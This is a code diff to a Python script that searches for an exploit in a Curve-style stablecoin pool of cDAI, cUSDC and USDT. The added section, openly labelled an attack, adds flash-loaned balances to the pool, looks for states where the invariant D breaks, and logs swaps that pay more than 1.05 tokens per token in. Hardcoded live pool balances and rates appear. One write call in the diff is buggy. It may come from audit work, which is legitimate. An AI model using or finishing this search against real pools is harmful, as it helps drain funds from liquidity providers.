@@ -240,7 +240,7 @@ def solutionFinder(s):
         #If we find something that gives us an effective price of more than 1.05, print it 
         if amount_usdc_out_underlying > 1.05*amount_dai_in_underlying:
             write(str(s),"Solution found, swap DAI for USDC")
-            write(str(s),"Amount to swap: "+ str(amount_dai_in_underlying)
+            write(str(s),"Amount to swap: "+ str(amount_dai_in_underlying))
             write(str(s),"Profit: "+ str((amount_usdc_out_underlying - amount_dai_in_underlying)//PRECISION)+ " USD")
             write(str(s),"...")
         #To adapt for USDC and USDT
@@ -257,3 +257,82 @@ try:
     while True: time.sleep(100)
 except (KeyboardInterrupt, SystemExit):
     print('exit')
+
+#More sophisticated attack: 
+# 1/ Find balances in the pool such that we find a D that doesn't satisfy the equality of the invariant
+# 2/ Change the balances to this amount
+# 3/ With these balances, try to swap an amount ~10% of the pool content
+# 4/ If we get an effective price such that 1 token in gives > 1.05 tokens out, we found a solution
+# 5/ Save the balances required to achieve that, save the profit
+# 6/ For later: need to remove liquidity to pay back the flash loan so we'll need to code the remove_liquidity function to test it to the end but I think proving that we can swap with a broken spot price is enough
+
+#Read by the attack contract from Compound
+rates = [210610623344836502016616268, 215836695449259000000000000, 1000000000000000000000000000000]
+
+#Read from Etherscan for the USDT pool
+fee = 4000000
+
+#Funds available in DAI, USDC, USDT. Assume 100M of each. 
+funds_avail = [100000000*1e18, 100000000*1e18, 100000000*1e18]
+
+iteration = 0
+
+while True: 
+    #Current amounts of cDAI, cUSDC and USDT in the pool and conversion into DAI and USDC amounts
+    cdai = 1497583531010282
+    cusdc = 3258032451817647
+    usdt = 40550284699
+    #Conversion to underlying
+    dai = cdai * rates[0] // PRECISION
+    usdc = cusdc * rates[1] // PRECISION
+    usdt = usdt
+    current_values_underlying = [dai, usdc, usdt * rates[2] // PRECISION]
+    #Random perturbation to the pool composition between 1 and the funds available
+    perturb_dai = randint(dai, dai+funds_avail[0])
+    perturb_usdc = randint(usdc, usdc+funds_avail[1])
+    perturb_usdt = randint(usdt, usdt+funds_avail[2])
+    #Add flash loaned liquidity to the pool
+    new_values_underlying = [dai+perturb_dai, usdc+perturb_usdc, usdt+perturb_usdt]
+    #Get D for this new pool composition
+    D = solver.get_D(new_values_underlying, amp)
+    #Check if the D found breaks the invariant
+    u = USDTpool(new_values_underlying, amp, D)
+    if abs(u) > 0: 
+        #Convert new balances back to cTokens
+        new_cdai = new_values_underlying[0] * PRECISION // rates[0]
+        new_cusdc = new_values_underlying[1] * PRECISION // rates[1]
+        new_usdt = new_values_underlying[2] * PRECISION // rates[2]
+        new_values = [new_cdai, new_cusdc, new_usdt]
+
+        #DAI -> USDC test
+        #Try to swap 10% of the original amount of cTokens and see what we get out 
+        amount_dai_in_ctoken = cdai // 10
+        #Convert that in the corresponding amount of DAI using the rates function, same as in the _xp() fucntion
+        amount_dai_in_underlying = amount_dai_in_ctoken*rates[0] // PRECISION
+        #Check the amount of cUSDC calculated out for that amount in
+        amount_usdc_out_ctokens = solver._exchange(0, 1, new_values, amount_dai_in_ctoken, rates, fee, amp)
+        #Convert to the corresponding amount of USDC
+        amount_usdc_out_underlying = amount_usdc_out_ctokens*rates[1] // PRECISION
+        #If we get more than 1.05 USDC for each DAI, save the amounts required for the attack and the discrepancy in effective price
+        if amount_usdc_out_underlying > 1.05*amount_dai_in_underlying:
+            print("Solution found!")
+            file = open("D_based_attack_solutions.txt", "a")
+            file.write("Amount of tokens to add: " + str(perturb_dai*PRECISION//rates[0]) + " cDAI, " + str(perturb_usdc*PRECISION//rates[1]) +  " cUSDC, " + str(perturb_usdt*PRECISION//rates[2]) + " USDT \n")
+            file.write("Corresponding amount of underlying: " + str(perturb_dai) + " cDAI, " + str(perturb_usdc) +  " cUSDC, " + str(perturb_usdt) + " USDT \n")
+            file.write("Swap DAI for USDC. Amount to swap: " + str(amount_dai_in_underlying), "\n")
+            file.write("Effective exchange rate :" + str(amount_usdc_out_underlying/amount_dai_in_underlying) + "\n")
+            file.write("Iteration " + str(iteration) + "\n \n")
+            print("...")
+            file.close()
+
+        #USDC -> DAI test
+
+        #DAI -> USDT test
+
+        #USDT -> DAI test
+
+        #USDC -> USDT test
+
+        #USDT -> USDC test
+
+        iteration += 1
